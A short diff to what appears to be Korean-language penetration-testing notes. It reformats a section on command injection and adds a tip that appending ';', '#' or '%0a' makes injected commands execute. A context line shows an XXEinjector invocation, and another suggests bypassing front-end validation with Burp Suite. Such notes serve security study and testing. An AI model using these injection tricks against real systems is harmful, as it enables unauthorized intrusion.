@@ -901,9 +901,8 @@ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=
 <details>
 <summary><strong>Command Injection</strong></summary>
 
-## Command Injection
-
-> 사용자 입력이 시스템 명령으로 실행될 때 악의적인 명령을 주입하는 공격 기법입니다.
+- 사용자 입력이 시스템 명령으로 실행될 때 악의적인 명령을 주입하는 공격 기법입니다.
+- 마지막에 `;`, `#`, `%0a`를 붙여줘야 제대로 실행이 된다.
 
 ### 기본 우회 기법
 - front에서만 처리되는 validation 해제하고 실행해보기. 혹은 burpsuite로 우회하기.
